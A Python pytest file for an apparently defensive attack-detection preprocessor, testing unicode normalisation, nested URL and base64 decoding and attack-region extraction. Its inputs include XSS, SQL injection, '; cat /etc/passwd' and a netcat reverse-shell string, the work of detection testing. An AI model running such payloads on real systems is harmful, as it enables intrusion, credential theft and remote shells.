from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from guard_core._utils.detection_scan import _scan_value_budget
from guard_core.detection_engine.preprocessor import ContentPreprocessor


def test_initialization() -> None:
    preprocessor = ContentPreprocessor()
    assert preprocessor.max_content_length == 10000
    assert preprocessor.preserve_attack_patterns is True
    assert preprocessor.agent_handler is None
    assert preprocessor.correlation_id is None
    assert len(preprocessor.attack_indicators) > 0
    assert len(preprocessor.compiled_indicators) == len(preprocessor.attack_indicators)

    agent_handler = MagicMock()
    preprocessor = ContentPreprocessor(
        max_content_length=5000,
        preserve_attack_patterns=False,
        agent_handler=agent_handler,
        correlation_id="test-123",
    )
    assert preprocessor.max_content_length == 5000
    assert preprocessor.preserve_attack_patterns is False
    assert preprocessor.agent_handler is agent_handler
    assert preprocessor.correlation_id == "test-123"


def test_normalize_unicode() -> None:
    preprocessor = ContentPreprocessor()

    test_cases = [
        ("\u2044", "/"),
        ("\uff0f", "/"),
        ("\u29f8", "/"),
        ("\u0130", "I"),
        ("\u0131", "i"),
        ("\u200b", ""),
        ("\u200c", ""),
        ("\u200d", ""),
        ("\ufeff", ""),
        ("\u00ad", ""),
        ("\u037e", ";"),
        ("\uff1c", "<"),
        ("\uff1e", ">"),
    ]

    for input_char, expected in test_cases:
        result = preprocessor.normalize_unicode(f"test{input_char}test")
        assert result == f"test{expected}test"

    malicious = f"<script{chr(0x200B)}>{chr(0xFF0F)}alert(1){chr(0xFF1C)}/script>"
    normalized = preprocessor.normalize_unicode(malicious)
    assert normalized == "<script>/alert(1)</script>"


def test_remove_excessive_whitespace() -> None:
    preprocessor = ContentPreprocessor()

    assert (
        preprocessor.remove_excessive_whitespace("test  multiple   spaces")
        == "test multiple spaces"
    )

    assert (
        preprocessor.remove_excessive_whitespace("test\t\ttabs\n\nnewlines")
        == "test tabs newlines"
    )

    assert (
        preprocessor.remove_excessive_whitespace("  leading trailing  ")
        == "leading trailing"
    )

    assert (
        preprocessor.remove_excessive_whitespace("  mixed\t \n  whitespace  ")
        == "mixed whitespace"
    )


def test_remove_null_bytes() -> None:
    preprocessor = ContentPreprocessor()

    assert preprocessor.remove_null_bytes("test\x00null\x00bytes") == "testnullbytes"

    content = "test\x01\x02\x03control\x04\x05chars"
    result = preprocessor.remove_null_bytes(content)
    assert result == "testcontrolchars"

    content = "test\ttab\nnewline\rcarriage"
    result = preprocessor.remove_null_bytes(content)
    assert result == content


@pytest.mark.asyncio
async def test_send_preprocessor_event_no_agent() -> None:
    preprocessor = ContentPreprocessor(agent_handler=None)

    await preprocessor._send_preprocessor_event(
        event_type="test_event", action_taken="test_action", reason="test_reason"
    )


@pytest.mark.asyncio
async def test_send_preprocessor_event_with_agent() -> None:
    agent_handler = MagicMock()
    agent_handler.send_event = AsyncMock()

    preprocessor = ContentPreprocessor(
        agent_handler=agent_handler, correlation_id="test-456"
    )

    await preprocessor._send_preprocessor_event(
        event_type="test_event",
        action_taken="test_action",
        reason="test_reason",
        extra_data="test_value",
    )

    agent_handler.send_event.assert_called_once()
    event = agent_handler.send_event.call_args[0][0]
    assert event.event_type == "test_event"
    assert event.action_taken == "test_action"
    assert event.reason == "test_reason"
    assert event.metadata["component"] == "ContentPreprocessor"
    assert event.metadata["correlation_id"] == "test-456"
    assert event.metadata["extra_data"] == "test_value"


@pytest.mark.asyncio
async def test_send_preprocessor_event_with_error() -> None:
    agent_handler = MagicMock()
    agent_handler.send_event = AsyncMock(side_effect=Exception("Agent error"))

    preprocessor = ContentPreprocessor(agent_handler=agent_handler)

    with patch("logging.getLogger") as mock_logger:
        mock_logger.return_value.error = MagicMock()

        await preprocessor._send_preprocessor_event(
            event_type="test_event", action_taken="test_action", reason="test_reason"
        )

        mock_logger.return_value.error.assert_called_once()
        error_msg = mock_logger.return_value.error.call_args[0][0]
        assert "Failed to send preprocessor event to agent" in error_msg


def test_extract_attack_regions_max_regions() -> None:
    preprocessor = ContentPreprocessor(max_content_length=500)

    content = ""
    for i in range(10):
        content += f" <script>alert({i})</script> padding " * 10

    regions = preprocessor.extract_attack_regions(content)

    assert len(regions) <= 5


def test_extract_attack_regions_timeout() -> None:
    preprocessor = ContentPreprocessor()

    with _scan_value_budget(10, max_scan_seconds=0.0):
        regions = preprocessor.extract_attack_regions("<script>alert(1)</script>")

    assert regions == []


def test_extract_attack_regions_early_break() -> None:
    preprocessor = ContentPreprocessor(max_content_length=200)

    content = "<script>test1</script> " * 50

    regions = preprocessor.extract_attack_regions(content)

    assert len(regions) <= 2


def test_extract_attack_regions_merge_overlapping() -> None:
    preprocessor = ContentPreprocessor()

    content = "text before <script>javascript:alert(1)</script> text after"

    regions = preprocessor.extract_attack_regions(content)

    assert len(regions) >= 1

    for i in range(1, len(regions)):
        assert regions[i][0] > regions[i - 1][1]


def test_extract_attack_regions_non_overlapping() -> None:
    preprocessor = ContentPreprocessor()

    content = "<script>test</script>" + "x" * 500 + "SELECT * FROM users"

    regions = preprocessor.extract_attack_regions(content)

    assert len(regions) >= 2
    assert regions[1][0] > regions[0][1]


def test_extract_attack_regions_no_attacks() -> None:
    preprocessor = ContentPreprocessor()

    content = "This is just normal text without any attack patterns"
    regions = preprocessor.extract_attack_regions(content)

    assert regions == []


def test_truncate_safely_no_truncation_needed() -> None:
    preprocessor = ContentPreprocessor(max_content_length=1000)

    content = "Short content"
    result = preprocessor.truncate_safely(content)

    assert result == content


def test_truncate_safely_preserve_disabled() -> None:
    preprocessor = ContentPreprocessor(
        max_content_length=50, preserve_attack_patterns=False, max_full_scan_bytes=50
    )

    content = "a" * 100
    result = preprocessor.truncate_safely(content)

    assert len(result) == 50
    assert result == "a" * 50


def test_truncate_safely_no_attack_patterns() -> None:
    preprocessor = ContentPreprocessor(max_content_length=50)

    content = "This is normal content without attacks " * 10
    result = preprocessor.truncate_safely(content)

    assert result == content


def test_truncate_safely_attack_regions_exceed_max() -> None:
    preprocessor = ContentPreprocessor(max_content_length=100)

    content = "<script>alert(1)</script>" * 20

    result = preprocessor.truncate_safely(content)

    assert result == content
    assert "<script>" in result


def test_truncate_safely_with_non_attack_content() -> None:
    preprocessor = ContentPreprocessor(max_content_length=50)

    content = (
        "safe_prefix_content_before"
        + "<script>alert(1)</script>"
        + "safe_suffix_content_after"
    )

    result = preprocessor.truncate_safely(content)

    assert "<script>alert(1)</script>" in result

    assert "safe_prefix" in result

    assert result == content


@pytest.mark.asyncio
async def test_decode_common_encodings_url_decode_error() -> None:
    agent_handler = MagicMock()
    agent_handler.send_event = AsyncMock()
    preprocessor = ContentPreprocessor(agent_handler=agent_handler)

    with patch(
        "guard_core.detection_engine.encoding_decoders.percent_decode",
        side_effect=Exception("URL decode error"),
    ):
        content = "%3Cscript%3E"
        await preprocessor.decode_common_encodings(content)

        agent_handler.send_event.assert_called()
        event = agent_handler.send_event.call_args[0][0]
        assert event.event_type == "decoding_error"
        assert event.action_taken == "decode_failed"
        assert "URL decode" in event.reason


@pytest.mark.asyncio
async def test_decode_common_encodings_html_decode_error() -> None:
    agent_handler = MagicMock()
    agent_handler.send_event = AsyncMock()
    preprocessor = ContentPreprocessor(agent_handler=agent_handler)

    with patch("html.unescape", side_effect=Exception("HTML decode error")):
        content = "&lt;script&gt;"
        await preprocessor.decode_common_encodings(content)

        agent_handler.send_event.assert_called()
        event = agent_handler.send_event.call_args[0][0]
        assert event.event_type == "decoding_error"
        assert event.action_taken == "decode_failed"
        assert "HTML decode" in event.reason


@pytest.mark.asyncio
async def test_decode_common_encodings_iterations() -> None:
    preprocessor = ContentPreprocessor()

    content = "%253Cscript%253E"
    result = await preprocessor.decode_common_encodings(content)

    assert result == "<script>"

    content = "%26lt%3Bscript%26gt%3B"
    result = await preprocessor.decode_common_encodings(content)

    assert result == "<script>"


@pytest.mark.asyncio
async def test_decode_common_encodings_max_iterations() -> None:
    preprocessor = ContentPreprocessor()

    content = "test"
    for _ in range(5):
        content = content.replace("<", "%3C")

    result = await preprocessor.decode_common_encodings(content)

    assert "%3C" not in result or result.count("%3C") > 0


@pytest.mark.asyncio
async def test_preprocess_empty_content() -> None:
    preprocessor = ContentPreprocessor()

    result = await preprocessor.preprocess("")
    assert result == ""


def test_preprocess_signal_preserving_empty_content() -> None:
    preprocessor = ContentPreprocessor()

    assert preprocessor.preprocess_signal_preserving("") == ""


def test_preprocess_signal_preserving_keeps_raw_attack_markers() -> None:
    preprocessor = ContentPreprocessor(max_content_length=200)

    fullwidth_slash = chr(0xFF0F)
    content = f"admin'--\r\nSet-Cookie: x{fullwidth_slash}1 uid=*)%00"

    result = preprocessor.preprocess_signal_preserving(content)

    assert "--" in result
    assert "\r\n" in result
    assert "%00" in result
    assert chr(0xFF0F) not in result
    assert "/1" in result


@pytest.mark.asyncio
async def test_preprocess_url_decoded_newline_preserving_empty_content() -> None:
    preprocessor = ContentPreprocessor()

    assert await preprocessor.preprocess_url_decoded_newline_preserving("") == ""


@pytest.mark.asyncio
async def test_preprocess_url_decoded_newline_preserving_decodes_content() -> None:
    preprocessor = ContentPreprocessor(max_content_length=200)

    fullwidth_slash = chr(0xFF0F)
    content = f"admin%27--\r\nSet-Cookie: x{fullwidth_slash}1 uid=*)%00"

    result = await preprocessor.preprocess_url_decoded_newline_preserving(content)

    assert isinstance(result, str)
    assert "'" in result
    assert "\r\n" in result
    assert chr(0xFF0F) not in result
    assert "/1" in result
    assert len(result) <= 200


@pytest.mark.asyncio
async def test_preprocess_full_flow() -> None:
    preprocessor = ContentPreprocessor(max_content_length=200)

    zwsp = chr(0x200B)
    fullwidth_slash = chr(0xFF0F)
    content = (
        f"{zwsp}<script>{fullwidth_slash}alert(1)"
        "</script>  multiple   spaces %3Cimg%3E\x00null"
    )

    result = await preprocessor.preprocess(content)

    assert chr(0x200B) not in result
    assert chr(0xFF0F) not in result
    assert "  " not in result
    assert "<img>" in result
    assert "\x00" not in result
    assert len(result) <= 200


@pytest.mark.asyncio
async def test_preprocess_batch() -> None:
    preprocessor = ContentPreprocessor()

    contents = ["<script>alert(1)</script>", "%3Cimg%3E", "normal text", ""]

    results = await preprocessor.preprocess_batch(contents)

    assert len(results) == len(contents)
    assert results[0] == "<script>alert(1)</script>"
    assert results[1] == "<img>"
    assert results[2] == "normal text"
    assert results[3] == ""


def test_attack_indicators_compilation() -> None:
    preprocessor = ContentPreprocessor()

    test_content = "<script>alert(1)</script> SELECT * FROM users <?php eval() <iframe>"

    matches = []
    for indicator in preprocessor.compiled_indicators:
        if indicator.search(test_content):
            matches.append(indicator.pattern)

    assert len(matches) > 0
    assert any("<script" in m for m in matches)
    assert any("SELECT" in m for m in matches)
    assert any(r"<\?php" in m for m in matches)


@pytest.mark.asyncio
async def test_integration_xss_bypass_attempt() -> None:
    preprocessor = ContentPreprocessor()

    xss = f"<scr{chr(0x200B)}ipt>al{chr(0x200C)}ert(1)</sc{chr(0x200D)}ript>"
    result = await preprocessor.preprocess(xss)

    assert "<script>alert(1)</script>" in result


@pytest.mark.asyncio
async def test_integration_sql_injection_bypass() -> None:
    preprocessor = ContentPreprocessor()

    sqli = "1' %55NION %53ELECT * FROM users--"
    result = await preprocessor.preprocess(sqli)

    assert "UNION SELECT" in result


@pytest.mark.asyncio
async def test_integration_padding_attack() -> None:
    preprocessor = ContentPreprocessor(max_content_length=200)

    attack = "a" * 50 + "<script>alert(1)</script>" + "b" * 2000
    result = await preprocessor.preprocess(attack)

    assert "script" in result
    assert "<script>alert(1)</script>" in result


def test_extract_and_concatenate_regions_consumes_all_without_break() -> None:
    from guard_core.detection_engine.preprocessor import ContentPreprocessor

    pp = ContentPreprocessor(max_content_length=1000, preserve_attack_patterns=True)
    regions = [(0, 5), (10, 15)]
    content = "AAAAA_____BBBBB"
    out = pp._extract_and_concatenate_attack_regions(content, regions)
    assert out == "AAAAABBBBB"


def test_extract_and_concatenate_attack_regions_multiple_iterations_before_limit() -> (
    None
):
    from guard_core.detection_engine.preprocessor import ContentPreprocessor

    pp = ContentPreprocessor(max_content_length=8, preserve_attack_patterns=True)
    # Two regions each of length 5; first consumes 5, second consumes 3, then break.
    regions = [(0, 5), (10, 15)]
    content = "AAAAA_____BBBBB"
    out = pp._extract_and_concatenate_attack_regions(content, regions)
    assert out == "AAAAABBB"


async def test_decode_common_encodings_exits_after_max_iterations() -> None:
    import urllib.parse

    from guard_core.detection_engine.preprocessor import ContentPreprocessor

    pp = ContentPreprocessor()
    content = "<"
    for _ in range(17):
        content = urllib.parse.quote(content, safe="")
    out = await pp.decode_common_encodings(content)
    assert out != content
    assert "%" in out


@pytest.mark.asyncio
async def test_decode_common_encodings_unwraps_five_layer_base64_polyglot() -> None:
    import base64

    preprocessor = ContentPreprocessor()

    payload = "<script>alert(1)</script>"
    encoded = payload
    for _ in range(5):
        encoded = base64.b64encode(encoded.encode()).decode()

    result = await preprocessor.decode_common_encodings(encoded)

    assert "<script>" in result
    assert "</script>" in result


def test_decode_base64_candidates_returns_token_when_decoded_is_non_printable() -> None:
    preprocessor = ContentPreprocessor()

    content = "AAAAAAAAAAAAAAAAAAAA"

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


def test_decode_base64_candidates_twelve_char_run_is_a_decode_candidate() -> None:
    preprocessor = ContentPreprocessor()

    content = "bmluZS1ieXRl"

    result = preprocessor._decode_base64_candidates(content)

    assert result == "nine-byte"


def test_decode_base64_candidates_eleven_char_run_is_not_a_decode_candidate() -> None:
    preprocessor = ContentPreprocessor()

    content = "prefix bmluZS1ieXR suffix"

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


def test_decode_base64_candidates_recovers_payload_glued_across_blank_line() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    blob = base64.b64encode(payload.encode()).decode()
    content = f"Content-Transfer-Encoding: base64\r\n\r\n{blob}"

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result
    assert "Content-Transfer-Encoding: base64" in result


def test_decode_base64_candidates_single_line_break_keeps_candidate_joined() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>" * 3
    blob = base64.b64encode(payload.encode()).decode()
    wrapped = "\r\n".join(blob[i : i + 76] for i in range(0, len(blob), 76))

    result = preprocessor._decode_base64_candidates(wrapped)

    assert payload in result


def test_base64_re_merges_across_a_blank_line_into_one_candidate() -> None:
    preprocessor = ContentPreprocessor()
    content = "AAAAAAAAAAAA\r\n\r\nbmluZS1ieXRl"

    matches = [m.group(0) for m in preprocessor._BASE64_RE.finditer(content)]

    assert len(matches) == 1
    assert matches[0] == content


def test_decode_base64_candidates_recovers_payload_past_two_single_break_decoys() -> (
    None
):
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    blob = base64.b64encode(payload.encode()).decode()
    content = f"AAAAAAAAAAAA\nB\n{blob}"

    matches = [m.group(0) for m in preprocessor._BASE64_RE.finditer(content)]
    result = preprocessor._decode_base64_candidates(content)

    assert len(matches) == 1
    assert payload in result


def test_decode_base64_candidates_recovers_payload_past_three_single_break_decoys() -> (
    None
):
    import base64

    preprocessor = ContentPreprocessor()
    payload = "' OR '1'='1' -- comment for admin bypass"
    blob = base64.b64encode(payload.encode()).decode()
    content = f"AAAAAAAAAAAA\nB\nCCCCCCCCCCCC\nD\n{blob}"

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_content_split_by_stylistic_break() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = (
        "a legitimate document body delivered as one continuous base64 "
        "attachment, with a stylistic blank line inserted mid-stream by "
        "an upstream relay, at a byte offset that does not fall on a "
        "four-character boundary"
    )
    blob = base64.b64encode(payload.encode()).decode()
    split_at = 37
    content = blob[:split_at] + "\n\n" + blob[split_at:]

    matches = [m.group(0) for m in preprocessor._BASE64_RE.finditer(content)]
    result = preprocessor._decode_base64_candidates(content)

    assert len(matches) == 1
    assert payload in result


def test_decode_base64_candidates_leaves_too_short_run_untouched_on_fallback() -> None:
    preprocessor = ContentPreprocessor()

    result = preprocessor._decode_base64_candidates("short\nbmluZS1ieXRl")

    assert result.startswith("short\n")
    assert "nine-byte" in result


def test_decode_base64_candidates_leaves_hex_literal_run_untouched_on_fallback() -> (
    None
):
    preprocessor = ContentPreprocessor()
    hex_literal = "0x2f6574632f706173737764"
    content = f"{hex_literal}\nbmluZS1ieXRl"

    result = preprocessor._decode_base64_candidates(content)

    assert hex_literal in result
    assert "nine-byte" in result


def test_decode_base64_candidates_rejects_low_quality_fallback_decode() -> None:
    preprocessor = ContentPreprocessor()
    content = "Xk29LmQpZt841HbNcRfWs\nwzV6Kj1oJ2OnYwhzMgjJns"

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


def test_decode_base64_candidates_leaves_short_payload_below_run_floor() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "id"
    token = base64.b64encode(payload.encode()).decode()
    content = f"AAAAAAAAAAAA\nB\n{token}"

    result = preprocessor._decode_base64_candidates(content)

    assert payload not in result
    assert token in result


def _fragment_below_run_floor(payload: str) -> str:
    import base64
    import string

    raw = payload.encode()
    parts = []
    for index in range(0, len(raw), 6):
        decoy = string.ascii_uppercase[(index // 6) % 26] * 12
        chunk = base64.b64encode(raw[index : index + 6]).decode()
        parts.append(decoy)
        parts.append(chunk)
    return "\n".join(parts)


def test_decode_base64_candidates_recovers_payload_fragmented_below_run_floor() -> None:
    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    content = _fragment_below_run_floor(payload)

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_fragmented_below_run_floor_needs_two_fragments() -> (
    None
):
    preprocessor = ContentPreprocessor()
    content = _fragment_below_run_floor("id")

    result = preprocessor._decode_base64_candidates(content)

    assert "id" not in result


_BENIGN_SHORT_IDENTIFIER_LINES = [
    "SKU48213",
    "SKU91027",
    "REF33810",
    "REF77492",
    "ORD10394",
    "ORD58261",
]


def test_stacked_benign_short_identifiers_stay_undetected_after_reassembly() -> None:
    preprocessor = ContentPreprocessor()
    content = "\n".join(_BENIGN_SHORT_IDENTIFIER_LINES)

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


def _b64_fragment_by(
    payload: str, sep: str, chunk: int = 6, urlsafe: bool = False
) -> str:
    import base64

    encoder = base64.urlsafe_b64encode if urlsafe else base64.b64encode
    encoded = encoder(payload.encode()).decode()
    return sep.join(encoded[i : i + chunk] for i in range(0, len(encoded), chunk))


def test_decode_base64_candidates_recovers_space_joined_fragments() -> None:
    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    content = _b64_fragment_by(payload, " ")

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_tab_joined_fragments() -> None:
    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    content = _b64_fragment_by(payload, "\t")

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_formfeed_joined_fragments() -> None:
    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    content = _b64_fragment_by(payload, "\f")

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_mixed_whitespace_joined_fragments() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "' OR 1=1 UNION SELECT password FROM admin--"
    encoded = base64.b64encode(payload.encode()).decode()
    seps = [" ", "\t", "\n", "\f", "\r\n"]
    parts = []
    for i in range(0, len(encoded), 6):
        parts.append(encoded[i : i + 6])
    content = seps[0].join(parts[:1])
    for index, part in enumerate(parts[1:], start=1):
        content += seps[index % len(seps)] + part

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_urlsafe_hyphen_whole_span() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    token = base64.urlsafe_b64encode(payload.encode()).decode()
    assert "-" in token

    result = preprocessor._decode_base64_candidates(token)

    assert result == payload


def test_decode_base64_candidates_recovers_urlsafe_underscore_whole_span() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "; cat /etc/passwd && echo ?0"
    token = base64.urlsafe_b64encode(payload.encode()).decode()
    assert "_" in token

    result = preprocessor._decode_base64_candidates(token)

    assert result == payload


def test_decode_base64_candidates_recovers_urlsafe_newline_joined_fragments() -> None:
    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    content = _b64_fragment_by(payload, "\n", urlsafe=True)

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_short_payload_with_single_padding_char() -> (
    None
):
    import base64

    preprocessor = ContentPreprocessor()
    payload = "*)(uid=*"
    token = base64.b64encode(payload.encode()).decode()
    assert token.endswith("=") and not token.endswith("==")

    result = preprocessor._decode_base64_candidates(token)

    assert result == payload


def test_decode_base64_candidates_recovers_double_padded_short_payload() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "{{7*7}}"
    token = base64.b64encode(payload.encode()).decode()
    assert token.endswith("==")

    result = preprocessor._decode_base64_candidates(token)

    assert result == payload


def test_decode_base64_candidates_recovers_padded_payload_newline_fragmented() -> None:
    preprocessor = ContentPreprocessor()
    payload = "*)(uid=*"
    content = _b64_fragment_by(payload, "\n")

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_base64_re_rejects_eleven_char_unpadded_run() -> None:
    preprocessor = ContentPreprocessor()

    assert preprocessor._BASE64_RE.search("AAAAAAAAAAA") is None


def test_base64_re_requires_ten_data_chars_for_double_padding() -> None:
    preprocessor = ContentPreprocessor()

    assert preprocessor._BASE64_RE.search("AAAAAAAAA==") is None
    assert preprocessor._BASE64_RE.search("AAAAAAAAAA==") is not None


def test_decode_base64_candidates_does_not_swallow_query_param_equals_sign() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "| nc -e /bin/sh 10.0.0.1 4444"
    blob = base64.b64encode(payload.encode()).decode()
    content = f"payload={blob}"

    result = preprocessor._decode_base64_candidates(content)

    assert result == f"payload={payload}"


def test_decode_base64_candidates_leaves_sql_keyword_phrase_intact() -> None:
    preprocessor = ContentPreprocessor()
    content = "1; EXEC xp_cmdshell('whoami')"

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


_BENIGN_HYPHENATED_SLUG_LINES = [
    "black-friday-deals",
    "customer-support-portal",
    "release-notes-v3-13-0",
    "content-transfer-encoding",
]


def test_stacked_benign_hyphenated_slugs_stay_undetected() -> None:
    preprocessor = ContentPreprocessor()
    content = "\n".join(_BENIGN_HYPHENATED_SLUG_LINES)

    result = preprocessor._decode_base64_candidates(content)

    assert result == content


def test_decode_base64_candidates_recovers_76_column_wrapped_mime() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>" * 3
    blob = base64.b64encode(payload.encode()).decode()
    wrapped = "\r\n".join(blob[i : i + 76] for i in range(0, len(blob), 76))

    result = preprocessor._decode_base64_candidates(wrapped)

    assert payload in result


_C0_CONTROL_SEPARATORS = {
    "VT": "\x0b",
    "FS": "\x1c",
    "GS": "\x1d",
    "RS": "\x1e",
    "US": "\x1f",
}
_ROUND_SIX_PAYLOADS = {
    "xss": "<script>alert(document.cookie)</script>",
    "sqli": "' OR 1=1--",
    "cmd": "; cat /etc/passwd",
}


def test_decode_base64_candidates_recovers_c0_control_joined_fragments() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    for sep in _C0_CONTROL_SEPARATORS.values():
        for payload in _ROUND_SIX_PAYLOADS.values():
            encoded = base64.b64encode(payload.encode()).decode()
            content = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
            result = preprocessor._decode_base64_candidates(content)
            assert payload in result


def test_decode_base64_candidates_recovers_equals_sign_joined_fragments() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "<script>alert(document.cookie)</script>"
    encoded = base64.b64encode(payload.encode()).decode()
    content = "=".join(encoded[i : i + 6] for i in range(0, len(encoded), 6))

    result = preprocessor._decode_base64_candidates(content)

    assert payload in result


def test_decode_base64_candidates_recovers_dash_underscore_joined_blob() -> None:
    import base64

    preprocessor = ContentPreprocessor()
    payload = "; cat /etc/passwd"
    encoded = base64.b64encode(payload.encode()).decode()
    for sep in ("-", "_"):
        content = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
        result = preprocessor._decode_base64_candidates(content)
        assert payload in result


def _b64decode_oracle_recovers(byte_value: int, payload: str) -> bool:
    import base64

    sep = chr(byte_value)
    encoded = base64.b64encode(payload.encode()).decode()
    fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
    try:
        return base64.b64decode(fragment).decode("utf-8", errors="strict") == payload
    except Exception:
        return False


@pytest.mark.parametrize("byte_value", range(0x80))
def test_decode_base64_candidates_matches_b64decode_oracle_for_ascii_byte(
    byte_value: int,
) -> None:
    import base64

    preprocessor = ContentPreprocessor()
    sep = chr(byte_value)
    for payload in _ROUND_SIX_PAYLOADS.values():
        oracle_recovers = _b64decode_oracle_recovers(byte_value, payload)

        encoded = base64.b64encode(payload.encode()).decode()
        fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
        result = preprocessor._decode_base64_candidates(fragment)
        impl_recovers = payload in result

        assert impl_recovers == oracle_recovers, (
            f"byte=0x{byte_value:02x} payload={payload!r} "
            f"oracle={oracle_recovers} impl={impl_recovers}"
        )


def _b64decode_oracle_recovers_raw_byte(byte_value: int, payload: str) -> bool:
    import base64

    sep = bytes([byte_value])
    encoded = base64.b64encode(payload.encode()).decode()
    fragment_bytes = sep.join(
        encoded[i : i + 6].encode() for i in range(0, len(encoded), 6)
    )
    try:
        return (
            base64.b64decode(fragment_bytes).decode("utf-8", errors="strict") == payload
        )
    except Exception:
        return False


@pytest.mark.parametrize("byte_value", range(0x80, 0x100))
def test_decode_base64_candidates_matches_b64decode_oracle_for_surrogate_escaped_byte(
    byte_value: int,
) -> None:
    import base64

    preprocessor = ContentPreprocessor()
    sep = bytes([byte_value]).decode("utf-8", errors="surrogateescape")
    for payload in _ROUND_SIX_PAYLOADS.values():
        oracle_recovers = _b64decode_oracle_recovers_raw_byte(byte_value, payload)

        encoded = base64.b64encode(payload.encode()).decode()
        fragment = sep.join(encoded[i : i + 6] for i in range(0, len(encoded), 6))
        result = preprocessor._decode_base64_candidates(fragment)
        impl_recovers = payload in result

        assert impl_recovers == oracle_recovers, (
            f"byte=0x{byte_value:02x} payload={payload!r} "
            f"oracle={oracle_recovers} impl={impl_recovers}"
        )


def test_decode_base64_candidates_decodes_padded_token_at_loose_primary_threshold() -> (
    None
):
    import base64

    preprocessor = ContentPreprocessor()
    raw = b"A" * 10 + b"\x01" * 10
    token = base64.b64encode(raw).decode("ascii")

    result = preprocessor._decode_base64_candidates(token)

    assert result == raw.decode("utf-8")


def test_decode_hex_escapes_replaces_two_digit_escape() -> None:
    preprocessor = ContentPreprocessor()

    result = preprocessor._decode_hex_escapes("prefix\\x41suffix")

    assert result == "prefixAsuffix"


def test_decode_unicode_escapes_replaces_four_digit_escape() -> None:
    preprocessor = ContentPreprocessor()

    result = preprocessor._decode_unicode_escapes("prefix\\u0041suffix")

    assert result == "prefixAsuffix"


def test_build_result_with_attack_regions_skips_gap_when_regions_are_adjacent() -> None:
    preprocessor = ContentPreprocessor(max_content_length=20)

    content = "AAAAABBBBB" + "C" * 10
    regions = [(0, 5), (5, 10)]

    result = preprocessor._build_result_with_attack_regions_and_context(
        content, regions
    )

    assert result.startswith("AAAAABBBBB")
    assert len(result) <= 20


def test_build_result_with_attack_regions_skips_gap_when_budget_exhausted() -> None:
    preprocessor = ContentPreprocessor(max_content_length=10)

    content = "xxxxxAAAAA" + "y" * 5 + "BBBBB"
    regions = [(5, 10), (15, 20)]

    result = preprocessor._build_result_with_attack_regions_and_context(
        content, regions
    )

    assert result == "AAAAABBBBB"


def test_build_result_with_attack_regions_appends_tail_within_budget() -> None:
    preprocessor = ContentPreprocessor(max_content_length=100)

    content = "prefix" + "<script>alert(1)</script>" + "tail"
    regions = [(6, 31)]

    result = preprocessor._build_result_with_attack_regions_and_context(
        content, regions
    )

    assert result == content


def test_full_scan_returns_whole_body_below_cap() -> None:
    preprocessor = ContentPreprocessor(max_content_length=50)

    content = "no indicator markers here " * 20
    result = preprocessor.truncate_safely(content)

    assert result == content
    assert len(result) == len(content)


def test_full_scan_returns_whole_body_at_cap_boundary() -> None:
    preprocessor = ContentPreprocessor(max_content_length=11000)

    content = "no indicator markers here " * 1000
    result = preprocessor.truncate_safely(content)

    assert result == content
    assert len(result) == len(content)


def test_full_scan_covers_front_middle_and_back_of_oversized_body() -> None:
    preprocessor = ContentPreprocessor(max_content_length=10000)
    marker = "1' OR '1'='1"

    front = marker + " " + "B" * 20000
    back = "A" * 20000 + " " + marker
    dead_center = "A" * 100000 + " " + marker + " " + "B" * 100000

    assert marker in preprocessor.truncate_safely(front)
    assert marker in preprocessor.truncate_safely(back)
    assert marker in preprocessor.truncate_safely(dead_center)


def test_bounded_gunzip_returns_none_for_non_gzip_bytes() -> None:
    preprocessor = ContentPreprocessor()
    assert preprocessor._bounded_gunzip(b"not gzip") is None


def test_bounded_gunzip_returns_none_for_corrupt_gzip_stream() -> None:
    preprocessor = ContentPreprocessor()
    corrupt = preprocessor._GZIP_MAGIC + b"\x00" * 30
    assert preprocessor._bounded_gunzip(corrupt) is None


def test_decode_base64_candidates_gunzips_within_budget() -> None:
    import base64
    import gzip

    preprocessor = ContentPreprocessor()
    token = base64.b64encode(
        gzip.compress(b"UNION SELECT password FROM users")
    ).decode()

    result = preprocessor._decode_base64_candidates(token, [1])

